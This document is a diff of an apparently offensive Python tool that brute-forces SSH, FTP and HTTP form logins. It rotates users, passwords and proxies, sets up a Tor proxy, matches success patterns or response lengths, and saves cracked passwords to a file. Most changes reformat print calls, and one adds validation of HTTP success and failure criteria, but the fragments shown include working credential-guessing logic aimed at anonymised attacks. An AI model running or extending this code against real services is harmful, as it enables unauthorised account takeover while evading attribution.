@@ -55,10 +55,12 @@ def is_service_running(ip, port, service, retries=3, delay=2):
                         print(f"{Fore.RED}ERROR: No HTTP service running on {ip}:{port}.")
                         return False
                 else:
-                    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unsupported service: {service} on port {port}")
+                    print(
+                        f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unsupported service: {service} on port {port}")
                     return False
             else:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection failed with result code: {result}")
+                print(
+                    f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Connection failed with result code: {result}")
 
         except socket.error as e:
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Socket error: {e}")
@@ -70,6 +72,7 @@ def is_service_running(ip, port, service, retries=3, delay=2):
 
     return False
 
+
 def is_http_service_running(url):
     try:
         response = requests.get(url, timeout=10)  # You can adjust this timeout as well
@@ -77,6 +80,8 @@ def is_http_service_running(url):
     except requests.exceptions.RequestException as e:
         print(f"HTTP request failed: {e}")
         return False
+
+
 def set_up_tor():
     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} INITIALIZING TOR PROXY...")
 
@@ -216,8 +221,9 @@ def http_attack(ip, user, password, http_post_params, success_pattern, failure_p
         data = http_post_params.replace('^USER^', user).replace('^PASS^', password)
         response = requests.post(f"http://{ip}", data=data, headers=headers, timeout=5)
         response_length = len(response.content)
-        print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}:CONTENT LENGTH: = {len(response.content)}\n")
-        print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}: {response.text[:2000]}")
+        print(
+            f"\n{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}:CONTENT LENGTH: = {len(response.content)}\n")
+        print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:2000]}")
         print(
             f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} trying {Fore.YELLOW}{user}{Fore.RESET} with pass:[*]:{Fore.YELLOW}{password}")
 
@@ -226,17 +232,17 @@ def http_attack(ip, user, password, http_post_params, success_pattern, failure_p
 
         if failure_content_length is not None and response_length != failure_content_length:
             print(current_timestamp(),
-                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
             return True  # Indicates success
 
         if success_content_length is not None and response_length == success_content_length:
             print(current_timestamp(),
-                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
             return True  # Indicates success
 
         if success_pattern and success_pattern in response.text:
             print(current_timestamp(),
-                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
             return True  # Indicates success
 
         if failure_pattern and failure_pattern in response.text:
@@ -419,9 +425,9 @@ if __name__ == '__main__':
                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Service: {Fore.YELLOW}{service}{Fore.RESET}")
             print(
                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
-            #if not is_service_running(args.ip, port, service):
-               # print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RED}ERROR: No service running on the specified port.")
-               # exit(1)
+            # if not is_service_running(args.ip, port, service):
+            # print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RED}ERROR: No service running on the specified port.")
+            # exit(1)
 
 
         else:
@@ -430,10 +436,10 @@ if __name__ == '__main__':
             print(
                 f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Port: {Fore.YELLOW}{port}{Fore.RESET}")
 
-            #if not is_service_running(args.ip, port, service):
-              #  print(
-               #     f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} ERROR: No service running on the specified port.")
-              #  exit(1)
+            # if not is_service_running(args.ip, port, service):
+            #  print(
+            #     f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} ERROR: No service running on the specified port.")
+            #  exit(1)
 
         proxies = []
         if args.proxies:
@@ -459,9 +465,11 @@ if __name__ == '__main__':
 
                 if idx == 0:
                     if not first_iteration:
-                        print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
+                        print(current_timestamp(),
+                              f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Returning to first user...")
                 else:
-                    print(current_timestamp(), f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")
+                    print(current_timestamp(),
+                          f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Switching to next user....")
 
                 if 'ssh' in service and not ssh_auth_type_checked:
                     print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Checking SSH authentication type.")
@@ -500,23 +508,34 @@ if __name__ == '__main__':
 
                         if handle_timeout(ssh_attack, args.ip, port, user, password, proxy_ip, proxy_port):
                             print(current_timestamp(),
-                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
+                                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
                             save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
                             users.remove(user)
                             break
                     elif 'ftp' in service:
                         if handle_timeout(ftp_attack, args.ip, user, password, proxy_ip, proxy_port):
                             print(current_timestamp(),
-                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
+                                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
                             save_to_file(args.ip, args.service, user, password, attempt_count)  # Added attempt_count
                             users.remove(user)
                             break
                     elif 'http' in service:
                         if not args.http_post:
                             raise ValueError(
-                                f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} HTTP POST parameters must be specified for HTTP attack.")
+                                f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} "
+                                "HTTP POST parameters must be specified for HTTP attack."
+                            )
 
-
+                            # Check for at least one of the other required parameters
+                        if not (args.failure_content_length or
+                                args.success_content_length or
+                                args.success_pattern or
+                                args.failure_pattern):
+                            raise ValueError(
+                                f"{Fore.WHITE}[{Fore.YELLOW}ERROR{Fore.WHITE}]{Fore.RESET}{Fore.RED} "
+                                "At least one of the following parameters must be specified for HTTP service: "
+                                "failure_content_length, success_content_length, success_pattern, failure_pattern."
+                            )
                         max_attempts = 3  # Number of passwords to try per round
                         num_users = len(users)
                         num_passwords = len(passwords)
